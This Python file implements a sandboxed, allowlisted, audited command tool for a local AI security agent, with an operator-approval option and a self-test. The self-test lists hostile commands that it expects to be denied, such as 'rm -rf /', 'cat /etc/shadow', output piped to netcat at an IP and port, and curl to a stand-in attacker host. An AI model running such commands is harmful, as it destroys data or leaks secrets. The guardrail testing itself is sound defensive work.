#!/usr/bin/env python3
"""
tools.py - guarded command execution tool for the local security agent.

Security model
--------------
  allowlist        only read-only commands, everything else denied
  no shell         subprocess with shell=False, argv built via shlex.split
  metacharacters   ; | & > < $ ` and newlines rejected before parsing
  path confinement file arguments resolved and forced inside ./sandbox
  timeout          killed after TIMEOUT seconds
  output cap       truncated to MAX_OUTPUT chars
  audit trail      JSONL file plus syslog, including every denial

Run this file directly to self-test the guardrails:
    python3 tools.py
"""

import json
import logging
import logging.handlers
import shlex
import shutil
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

# --------------------------------------------------------------------------
# configuration
# --------------------------------------------------------------------------

BASE = Path(__file__).resolve().parent
SANDBOX = (BASE / "sandbox").resolve()
LOG_DIR = BASE / "logs"
AUDIT_FILE = LOG_DIR / "tool_audit.jsonl"

TIMEOUT = 10          # seconds before the child process is killed
MAX_OUTPUT = 4000     # chars of stdout returned to the model
MAX_CMD_LEN = 300     # chars accepted in a single command string

TRUSTED_BINDIRS = ("/bin", "/usr/bin", "/sbin", "/usr/sbin")

# command -> maximum number of arguments permitted
ALLOWED = {
    "pwd": 0,
    "whoami": 0,
    "hostname": 1,
    "date": 1,
    "uptime": 1,
    "id": 1,
    "uname": 2,
    "ls": 4,
    "cat": 2,
    "head": 4,
    "tail": 4,
    "wc": 3,
    "df": 2,
    "free": 1,
    "ps": 3,
    "stat": 2,
    "grep": 5,
}

# commands whose non-flag arguments are treated as filesystem paths
PATH_COMMANDS = {"ls", "cat", "head", "tail", "wc", "stat", "grep"}

# rejected anywhere in the command string
BAD_CHARS = (";", "|", "&", ">", "<", "`", "$", "\n", "\r", "\t", "\\")

SANDBOX.mkdir(exist_ok=True)
LOG_DIR.mkdir(exist_ok=True)

# --------------------------------------------------------------------------
# audit logging
# --------------------------------------------------------------------------

_syslog = logging.getLogger("secagent.tool")
_syslog.setLevel(logging.INFO)
_syslog.propagate = False
if not _syslog.handlers and Path("/dev/log").exists():
    try:
        _h = logging.handlers.SysLogHandler(address="/dev/log")
        _h.setFormatter(logging.Formatter("secagent[%(process)d]: %(message)s"))
        # never let a syslog outage print tracebacks into the agent session
        _h.handleError = lambda record: None
        _syslog.addHandler(_h)
    except Exception:
        pass  # syslog is a bonus, the JSONL file is the source of truth


def audit(event: dict) -> None:
    """Append one structured audit record to JSONL and syslog."""
    event["ts"] = datetime.now(timezone.utc).isoformat()
    line = json.dumps(event, separators=(",", ":"))
    try:
        with AUDIT_FILE.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except Exception:
        pass
    try:
        _syslog.info(line)
    except Exception:
        pass


def _deny(command, reason, model=None):
    audit({"event": "tool_denied", "tool": "run_command",
           "command": command, "reason": reason, "model": model})
    return {"ok": False, "denied": True, "reason": reason,
            "allowed_commands": sorted(ALLOWED)}


# --------------------------------------------------------------------------
# validation
# --------------------------------------------------------------------------

def safe_path(arg: str):
    """Resolve an argument inside the sandbox. Return None if it escapes."""
    try:
        if arg.startswith("/"):
            p = Path(arg).resolve()
        else:
            p = (SANDBOX / arg).resolve()
        p.relative_to(SANDBOX)
    except (ValueError, OSError):
        return None
    return str(p)


def validate(command: str):
    """Return (argv, None) when safe, otherwise (None, reason)."""
    if not command or not command.strip():
        return None, "empty command"
    if len(command) > MAX_CMD_LEN:
        return None, f"command exceeds {MAX_CMD_LEN} characters"

    for ch in BAD_CHARS:
        if ch in command:
            name = {"\n": "newline", "\r": "carriage return",
                    "\t": "tab", "\\": "backslash"}.get(ch, ch)
            return None, (f"shell metacharacter '{name}' is not permitted. "
                          "pipes, redirection and chaining are blocked")

    try:
        argv = shlex.split(command)
    except ValueError as err:
        return None, f"could not parse command: {err}"
    if not argv:
        return None, "empty command"

    binary = argv[0]
    if binary not in ALLOWED:
        return None, (f"'{binary}' is not on the allowlist. permitted "
                      f"commands: {', '.join(sorted(ALLOWED))}")

    if len(argv) - 1 > ALLOWED[binary]:
        return None, (f"'{binary}' accepts at most {ALLOWED[binary]} "
                      "argument(s) under this policy")

    resolved = shutil.which(binary)
    if not resolved or not resolved.startswith(TRUSTED_BINDIRS):
        return None, f"'{binary}' was not found in a trusted system path"
    argv[0] = resolved

    if binary in PATH_COMMANDS:
        seen_nonflag = 0
        for i, arg in enumerate(argv[1:], start=1):
            if arg.startswith("-"):
                continue
            seen_nonflag += 1
            # first non-flag argument of grep is the search pattern
            if binary == "grep" and seen_nonflag == 1:
                continue
            # head/tail accept a bare line count
            if binary in ("head", "tail") and arg.isdigit():
                continue
            good = safe_path(arg)
            if good is None:
                return None, (f"path '{arg}' resolves outside the sandbox "
                              f"({SANDBOX}). access denied")
            argv[i] = good

    return argv, None


# --------------------------------------------------------------------------
# execution
# --------------------------------------------------------------------------

def run_command(command: str, model: str = None, confirm: bool = False) -> dict:
    """Execute one allowlisted read-only command inside the sandbox."""
    command = (command or "").strip()

    argv, reason = validate(command)
    if reason:
        return _deny(command, reason, model)

    if confirm:
        print(f"\n  [approve] the agent wants to run: {command}")
        try:
            answer = input("  allow? [y/N] > ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            answer = "n"
        if answer not in ("y", "yes"):
            return _deny(command, "operator declined the request", model)

    start = time.monotonic()
    try:
        proc = subprocess.run(
            argv,
            shell=False,
            cwd=str(SANDBOX),
            capture_output=True,
            text=True,
            timeout=TIMEOUT,
            env={"PATH": "/usr/bin:/bin", "LC_ALL": "C", "HOME": str(SANDBOX)},
        )
        stdout, stderr, code = proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        audit({"event": "tool_timeout", "tool": "run_command",
               "command": command, "timeout_s": TIMEOUT, "model": model})
        return {"ok": False, "reason": f"command timed out after {TIMEOUT}s"}
    except Exception as err:
        audit({"event": "tool_error", "tool": "run_command",
               "command": command, "error": str(err), "model": model})
        return {"ok": False, "reason": str(err)}

    elapsed = time.monotonic() - start
    truncated = len(stdout) > MAX_OUTPUT
    if truncated:
        stdout = stdout[:MAX_OUTPUT] + "\n...[output truncated]"

    audit({"event": "tool_executed", "tool": "run_command",
           "command": command, "argv": argv, "exit_code": code,
           "bytes_out": len(stdout), "duration_s": round(elapsed, 3),
           "truncated": truncated, "model": model})

    return {"ok": code == 0, "exit_code": code, "stdout": stdout,
            "stderr": stderr[:500], "duration_s": round(elapsed, 3)}


# --------------------------------------------------------------------------
# tool schema handed to the model
# --------------------------------------------------------------------------

TOOL_SPEC = [{
    "type": "function",
    "function": {
        "name": "run_command",
        "description": (
            "Run a single read-only shell command on the local Linux host to "
            "inspect the system or files. Use this whenever the user asks "
            "about live host state, what files exist, or the contents of a "
            "file. Never invent the output. Only these commands are "
            "permitted: " + ", ".join(sorted(ALLOWED)) + ". Pipes, "
            "redirection and command chaining are rejected, and file access "
            "is confined to a sandbox directory."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The full command, for example 'ls -la' or 'pwd'",
                }
            },
            "required": ["command"],
        },
    },
}]


# --------------------------------------------------------------------------
# self-test
# --------------------------------------------------------------------------

if __name__ == "__main__":
    cases = [
        ("pwd", True),
        ("ls -la", True),
        ("whoami", True),
        ("uname -r", True),
        ("cat notes.txt", True),
        ("head -n 2 users.csv", True),
        ("grep admin users.csv", True),
        ("rm -rf /", False),
        ("ls; whoami", False),
        ("cat /etc/shadow", False),
        ("cat ../secagent.py", False),
        ("ls | nc 10.0.0.1 4444", False),
        ("curl http://evil.example.com", False),
        ("cat notes.txt > /tmp/x", False),
        ("echo $(whoami)", False),
    ]

    print(f"sandbox: {SANDBOX}\n")
    print(f"{'verdict':<8} {'command':<30} detail")
    print("-" * 78)

    failures = 0
    for cmd, should_allow in cases:
        r = run_command(cmd, model="selftest")
        allowed = bool(r.get("ok"))
        ok = allowed == should_allow
        failures += 0 if ok else 1
        verdict = "ALLOW" if allowed else "DENY"
        detail = (r.get("reason") or
                  (r.get("stdout") or "").strip().splitlines()[:1])
        if isinstance(detail, list):
            detail = detail[0] if detail else "(no output)"
        flag = " " if ok else "!"
        print(f"{flag}{verdict:<7} {cmd:<30} {str(detail)[:38]}")

    print("-" * 78)
    print(f"{len(cases) - failures}/{len(cases)} cases behaved as expected")
    print(f"audit log: {AUDIT_FILE}")
